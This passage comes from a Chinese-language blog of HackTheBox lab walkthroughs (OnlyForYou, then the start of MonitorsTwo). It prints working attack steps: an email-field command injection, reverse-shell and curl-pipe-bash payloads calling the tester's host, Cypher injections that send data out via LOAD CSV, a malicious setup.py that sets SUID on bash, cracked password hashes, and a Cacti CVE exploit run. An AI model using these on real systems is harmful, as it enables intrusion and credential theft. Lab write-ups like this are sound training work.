				ipaddresses <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ip4:"</span><span class="token punctuation">)</span>
				ipaddresses<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
				<span class="token keyword">for</span> i <span class="token keyword">in</span> ipaddresses<span class="token punctuation">:</span>
					ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">1</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> ips<span class="token punctuation">:</span>
			<span class="token keyword">if</span> ip <span class="token operator">==</span> i<span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">2</span>
			<span class="token keyword">elif</span> ipaddress<span class="token punctuation">.</span>ip_address<span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token keyword">in</span> ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">2</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">sendmessage</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
	status <span class="token operator">=</span> issecure<span class="token punctuation">(</span>email<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
	<span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
		msg <span class="token operator">=</span> EmailMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>
		msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>email<span class="token punctuation">}</span></span><span class="token string">'</span></span>
		msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'info@only4you.htb'</span>
		msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>subject<span class="token punctuation">}</span></span><span class="token string">'</span></span>
		msg<span class="token punctuation">[</span><span class="token string">'Message'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>message<span class="token punctuation">}</span></span><span class="token string">'</span></span>

		smtp <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>
		smtp<span class="token punctuation">.</span>send_message<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
		smtp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> status
	<span class="token keyword">elif</span> status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> status
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å››ã€RCEåå¼¹shell"><a href="#å››ã€RCEåå¼¹shell" class="headerlink" title="å››ã€RCEåå¼¹shell"></a>å››ã€RCEåå¼¹shell</h2><p>å­˜åœ¨æ¼æ´çš„ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token number">0</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
	domain <span class="token operator">=</span> email<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
	result <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"dig txt </span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
	output <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŸå› ï¼š</p>
<p>1.å› ä¸º<code>re.match()</code>æ˜¯ä»å¤´å¼€å§‹åŒ¹é…ï¼›</p>
<p>2.ä¸”æ­¤ifæ¡ä»¶çš„æ­£åˆ™æ²¡æœ‰æŒ‡å®šåŒ¹é…ç»“å°¾çš„å…ƒå­—ç¬¦â€$â€ï¼›</p>
<p>3.ä»è€Œå¯¼è‡´åªè¦å­—ç¬¦ä¸²å‰åŠéƒ¨åˆ†æœ‰ç¬¦åˆé‚®ç®±è§„åˆ™çš„å­ä¸²ï¼Œå°±åŒ¹é…æˆåŠŸï¼Œæ‰§è¡Œelseï¼›</p>
<p>4.é‚£ä¹ˆemailæ˜¯<code>wa0er@htb.com;curl 127.0.0.1</code>ï¼Œå°±ä¼šå¯¼è‡´domainæ‹¼æ¥åˆ°digå‘½ä»¤æ—¶å˜æˆå¦‚ä¸‹ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">dig txt htb.com;curl 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¿®è¡¥æ€è·¯ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">1.æ›´æ¢re.match()ä¸ºre.fullmatch()
re.fullmatch("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(.[A-Z|a-z]{2,})", email)

2.æ­£åˆ™æ·»åŠ åŒ¹é…ç»“å°¾çš„å…ƒå­—ç¬¦"$"
re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})$", email)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆšæ‰çš„<code>app.py</code>ï¼Œformæ¨¡å—çš„sendmessageæ–¹æ³•åœ¨16è¡Œè¢«è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨æ ¹ç›®å½•è·¯ç”±è¢«è°ƒç”¨ï¼Œå¯¹æ¯”ä»£ç ä¸­æ¥æ”¶çš„POSTå‚æ•°ï¼ˆemail, subject, messageï¼‰ï¼Œåœ¨é¦–é¡µé¡¶éƒ¨èœå•æ å¯¹åº”ContactåŠŸèƒ½ç‚¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829140523613.png"></p>
<p>éšä¾¿å¡«ï¼ŒæŠ“åŒ…</p>
<p>ç”±äºä¼šè¿ç»­æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼ˆdigå’Œè‡ªå·±çš„ï¼‰ï¼Œç¬¬äºŒä¸ªå‘½ä»¤æ‰§è¡Œç»“æœçœ‹ä¸åˆ°ï¼Œæ‰€ä»¥é€šè¿‡è®¿é—®æœ¬åœ°httpæœåŠ¡æ¥æµ‹è¯•ã€‚éœ€è¦å…ˆæœ¬åœ°å¼€å¯httpæœåŠ¡ï¼Œç„¶åè¯·æ±‚åŒ…ä¿®æ”¹å¦‚ä¸‹å‘é€</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829140728113.png"></p>
<p>æŸ¥çœ‹httpæœåŠ¡ï¼ŒæˆåŠŸæ¥æ”¶åˆ°è®¿é—®è¯·æ±‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829140747406.png"></p>
<p>äºæ˜¯åå¼¹shell</p>
<p>æœ¬åœ°ä¸¤ä¸ªç»ˆç«¯çª—å£ï¼Œä¸€ä¸ªå¼€å¯httpæœåŠ¡ï¼Œä¸€ä¸ªå¼€å¯ç›‘å¬</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80
nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æœ¬åœ°æ–°å»ºä¸€ä¸ª<code>shell.sh</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åè¯·æ±‚åŒ…payloadä¿®æ”¹å¦‚ä¸‹ï¼Œå‘é€è¯·æ±‚</p>
<pre class="line-numbers language-none"><code class="language-none">curl 10.10.14.7/shell.sh|bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829144523981.png"></p>
<p>åå¼¹shellæˆåŠŸï¼Œè·å–www-dataæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829145053718.png"></p>
<h2 id="äº”ã€ç«¯å£è½¬å‘"><a href="#äº”ã€ç«¯å£è½¬å‘" class="headerlink" title="äº”ã€ç«¯å£è½¬å‘"></a>äº”ã€ç«¯å£è½¬å‘</h2><p>ç„¶åæŸ¥çœ‹ç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829150222348.png"></p>
<p>80ï¼ˆhttpï¼‰ã€53ï¼ˆdnsï¼‰ã€22ï¼ˆsshï¼‰ã€3306ï¼ˆmysqlï¼‰ã€33060ï¼ˆmysqlï¼‰éƒ½æ˜¯å¸¸è§„ç«¯å£</p>
<p>7474ã€7687åˆ†åˆ«æ˜¯neo4jæ•°æ®åº“æœåŠ¡çš„httpç«¯å£å’Œboltè¿æ¥å™¨ç«¯å£</p>
<p>3000ã€8001éå¸¸è§„ç«¯å£ï¼Œåº”è¯¥æœ‰webæœåŠ¡ï¼Œå°è¯•ç«¯å£è½¬å‘æŠŠæµé‡ä»£ç†å‡ºæ¥</p>
<p>ç›®æ ‡é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ä»æœ¬åœ°ä¸‹è½½chiselï¼ˆç¬”è€…æ­¤å¤„ä¸‹è½½åˆ°<code>/tmp</code>ç›®å½•ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/chisel
chmod +x chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¼€å¯æœåŠ¡ç«¯ç›‘å¬</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel server -p 9899 -reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›®æ ‡é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå®ç°ç«¯å£è½¬å‘</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel client 10.10.14.7:9899 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliæ˜¾ç¤ºå¦‚ä¸‹ï¼Œè¿æ¥å»ºç«‹æˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829151614436.png"></p>
<p>3000ç«¯å£ï¼Œçœ‹æ ·å­æ˜¯ä¸ªgitä»“åº“æ‰˜ç®¡æœåŠ¡</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829152048103.png" style="zoom: 67%;">

<p>8001ç«¯å£</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829152116286.png" style="zoom:67%;">

<p>å¼±å£ä»¤<code>admin: admin</code>ç™»å½•æˆåŠŸï¼Œä¸‹æ‹‰å‘ç°æ•°æ®åº“æ­£æ˜¯neo4j</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829152536267.png"></p>
<h2 id="å…­ã€Neo4jæ³¨å…¥"><a href="#å…­ã€Neo4jæ³¨å…¥" class="headerlink" title="å…­ã€Neo4jæ³¨å…¥"></a>å…­ã€Neo4jæ³¨å…¥</h2><p>å‚è€ƒï¼š<a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</a></p>
<p>neo4jåŸç†å‚è€ƒï¼š<a href="https://www.w3cschool.cn/neo4j/neo4j_building_blocks.html">https://www.w3cschool.cn/neo4j/neo4j_building_blocks.html</a></p>
<p>é¡µé¢å·¦ä¾§èœå•æ <code>EMPLOYEES</code>é€‰é¡¹ä¸­æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥å¦‚ä¸‹payloadï¼Œè·å–æœåŠ¡ç‰ˆæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.7/?version=' + version + '&amp;name=' + name + '&amp;edition=' + edition as l RETURN 0 as _0 //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°httpæœåŠ¡å¯çœ‹åˆ°å›æ˜¾å¾—åˆ°neo4jçš„æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829154348639.png"></p>
<p>åœ¨è¾“å…¥æ¡†è¾“å…¥ï¼Œé€šè¿‡burpä¼ å‚çš„è¯éœ€è¦ç»è¿‡URLç¼–ç ä¸”ç©ºæ ¼éœ€ç”¨åŠ å·æ›¿æ¢</p>
<p>è·å–labelï¼Œå¾—åˆ°userå’Œemployeeä¸¤ä¸ªlabel</p>
<pre class="line-numbers language-none"><code class="language-none">' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.7/?label='+label as l RETURN 0 as _0 //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829160213326.png"></p>
<p>è·å–userçš„properties of a keyï¼Œå¾—åˆ°adminå’Œjohnä¸¤ä¸ªç”¨æˆ·çš„usernameå’Œpasswordï¼ˆæœ‰äº›è‹±æ–‡åè¯æ€•ç¿»è¯‘è¯ä¸è¾¾æ„ï¼Œå°±æ²¡ç”¨ä¸­æ–‡ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.7/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829160620410.png"></p>
<p>ç”¨<a href="https://crackstation.net/%E7%A0%B4%E8%A7%A3hash%E5%80%BC%EF%BC%8C%E5%A6%82%E4%B8%8B">https://crackstation.net/ç ´è§£hashå€¼ï¼Œå¦‚ä¸‹</a></p>
<pre class="line-numbers language-none"><code class="language-none">8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918	admin
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6	ThisIs4You<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>sshè¿æ¥johnè´¦æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829161029091.png"></p>
<p>æ‰§è¡Œ<code>sudo -l</code>æŸ¥çœ‹èƒ½ä»¥rootèº«ä»½æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¯ä»3000ç«¯å£æœåŠ¡ä¸‹è½½åç¼€ä¸º<code>.tar.gz</code>çš„å‹ç¼©åŒ…</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829161232794.png"></p>
<h2 id="ä¸ƒã€pip-downloadä»£ç æ‰§è¡Œ"><a href="#ä¸ƒã€pip-downloadä»£ç æ‰§è¡Œ" class="headerlink" title="ä¸ƒã€pip downloadä»£ç æ‰§è¡Œ"></a>ä¸ƒã€pip downloadä»£ç æ‰§è¡Œ</h2><p>googleæœç´¢å…³é”®å­—ï¼špip download exploit</p>
<p><a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/</a></p>
<p><a href="https://github.com/wunderwuzzi23/this_is_fine_wuzzi">https://github.com/wunderwuzzi23/this_is_fine_wuzzi</a></p>
<p>ä¸‹è½½exploit</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¿®æ”¹<code>setup.py</code>ä¸¤ä¸ªä½ç½®ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829170231511.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> setuptools <span class="token keyword">import</span> setup<span class="token punctuation">,</span> find_packages
<span class="token keyword">from</span> setuptools<span class="token punctuation">.</span>command<span class="token punctuation">.</span>install <span class="token keyword">import</span> install
<span class="token keyword">from</span> setuptools<span class="token punctuation">.</span>command<span class="token punctuation">.</span>egg_info <span class="token keyword">import</span> egg_info
<span class="token keyword">import</span> os

<span class="token keyword">def</span> <span class="token function">RunCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"chmod u+s /bin/bash"</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">RunEggInfoCommand</span><span class="token punctuation">(</span>egg_info<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        RunCommand<span class="token punctuation">(</span><span class="token punctuation">)</span>
        egg_info<span class="token punctuation">.</span>run<span class="token punctuation">(</span>self<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">RunInstallCommand</span><span class="token punctuation">(</span>install<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        RunCommand<span class="token punctuation">(</span><span class="token punctuation">)</span>
        install<span class="token punctuation">.</span>run<span class="token punctuation">(</span>self<span class="token punctuation">)</span>

setup<span class="token punctuation">(</span>
    name <span class="token operator">=</span> <span class="token string">"this_is_fine_wuzzi"</span><span class="token punctuation">,</span>
    version <span class="token operator">=</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>
    license <span class="token operator">=</span> <span class="token string">"MIT"</span><span class="token punctuation">,</span>
    packages<span class="token operator">=</span>find_packages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    cmdclass<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">'install'</span> <span class="token punctuation">:</span> RunInstallCommand<span class="token punctuation">,</span>
        <span class="token string">'egg_info'</span><span class="token punctuation">:</span> RunEggInfoCommand
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨å¦‚ä¸‹å‘½ä»¤åœ¨<code>this_is_fine_wuzzi</code>ç›®å½•ä¸‹æ„å»ºpythonå‘å¸ƒåŒ…ï¼Œç¬”è€…æ­¤å¤„åœ¨virtualenvï¼ˆpython3.8.10è™šæ‹Ÿç¯å¢ƒï¼‰ä¸‹buildï¼Œå› ä¸ºæ­£å¸¸buildä¼šæŠ¥é”™</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829170416474.png"></p>
<p>buildå®Œæˆåä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆdistç›®å½•ï¼Œé‡Œé¢æœ‰ä¸ª<code>.tar.gz</code>æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829171107436.png"></p>
<p>ç”¨<code>john</code>çš„è´¦æˆ·å¯†ç <code>ThisIs4You</code>ç™»å½•3000ç«¯å£webç«¯</p>
<p>å³ä¸Šè§’åŠ å·æ–°å»ºä»“åº“ï¼Œé…ç½®å¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829174954941.png" style="zoom:67%;">

<p>æ–°å»ºä»“åº“æˆåŠŸåè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œç‚¹å‡»<code>Upload File</code>ä¸Šä¼ æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829175148157.png"></p>
<p>ä¸Šä¼ åˆšåˆšç”Ÿæˆçš„<code>.tar.gz</code>æ–‡ä»¶</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829175308815.png" style="zoom:67%;">

<p>ä¸Šä¼ æˆåŠŸå¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829175331963.png" style="zoom:67%;">

<p>ç„¶ååœ¨ç›®æ ‡é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯çœ‹åˆ°<code>/bin/bash</code>å·²ç»æœ‰äº†suidæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/wa0er/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829183729776.png"></p>
<p>æ‰§è¡Œ<code>bash -p</code>ææƒï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829183811688.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829200718553.png" style="zoom: 80%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Nginx</tag>
        <tag>Neo4jæ³¨å…¥</tag>
        <tag>pip downloadä»£ç æ‰§è¡Œ</tag>
        <tag>pythonä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-MonitorsTwo</title>
    <url>/posts/1ca70420.html</url>
    <content><![CDATA[<h1 id="HTB-MonitorsTwo"><a href="#HTB-MonitorsTwo" class="headerlink" title="HTB-MonitorsTwo"></a>HTB-MonitorsTwo</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†å‘ç°<code>Cacti</code>æ¡†æ¶å­˜åœ¨CVE-2022-46169å‘½ä»¤æ³¨å…¥æ¼æ´ï¼›</p>
<p>2.CVE-2022-46169å‘½ä»¤æ³¨å…¥è·å–www-dataæƒé™ï¼›</p>
<p>3.å‘ç°mysqlæ•°æ®åº“å’Œå¸¦suidçš„æ–‡ä»¶capshï¼›</p>
<p>4.capshææƒåˆ°rootï¼ˆæ­¤rootéå½¼rootï¼‰ï¼›</p>
<p>5.æ•°æ®åº“æŸ¥è¯¢å‘ç°sshç”¨æˆ·ï¼›</p>
<p>6.sshç”¨æˆ·è¿æ¥ä¸Šå»ï¼Œå‘ç°é‚®ä»¶ï¼Œå­˜åœ¨dockeræ¼æ´CVE-2021-41091ï¼›</p>
<p>7.dockeræ¼æ´ææƒåˆ°rootã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904091321625.png"></p>
<p>80ç«¯å£å¼€æ”¾ï¼Œé‚£ä¹ˆè®¿é—®webç«¯</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904091526144.png" style="zoom:80%;">

<h2 id="ä¸‰ã€CVE-2022-46169ï¼ˆCactiå‘½ä»¤æ³¨å…¥æ¼æ´ï¼‰"><a href="#ä¸‰ã€CVE-2022-46169ï¼ˆCactiå‘½ä»¤æ³¨å…¥æ¼æ´ï¼‰" class="headerlink" title="ä¸‰ã€CVE-2022-46169ï¼ˆCactiå‘½ä»¤æ³¨å…¥æ¼æ´ï¼‰"></a>ä¸‰ã€CVE-2022-46169ï¼ˆCactiå‘½ä»¤æ³¨å…¥æ¼æ´ï¼‰</h2><p>googleå…³é”®å­—Cacti exploit</p>
<p>æ‰¾åˆ°æ˜¯CVE-2022-46169</p>
<p>exploitï¼š<a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22">https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22</a></p>
<p>æœ¬åœ°å¼€å¯ç›‘å¬ï¼Œå¹¶æ‰§è¡Œexp</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898
python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.4 --LPORT=9898<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904091954548.png"></p>
<p>è·å–www-dataæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904092027843.png"></p>
<p>åœ¨<code>/var/www/html/</code>ä¸‹å‘ç°æ•°æ®åº“æ–‡ä»¶<code>cacti.sql</code>ï¼Œçœ‹åˆ°æœ‰adminç”¨æˆ·å¯†ç ï¼Œä½†å®é™…æ— æ³•ç™»å½•ä¸»é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904164948097.png"></p>
<p>æ ¹ç›®å½•æœ‰<code>entrypoint.sh</code>ï¼Œå¯çœ‹åˆ°æ˜¯mysqlæ•°æ®åº“ï¼Œæœ‰ä¸€äº›æ•°æ®åº“å‘½ä»¤</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904170007786.png"></p>
<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥æ‰¾æœ‰suidæƒé™çš„æ–‡ä»¶ï¼Œçœ‹åˆ°/sbin/capshï¼Œæ¯”è¾ƒç½•è§</p>
<pre class="line-numbers language-none"><code class="language-none">find / -perm -u=s -type f 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904161452855.png"></p>
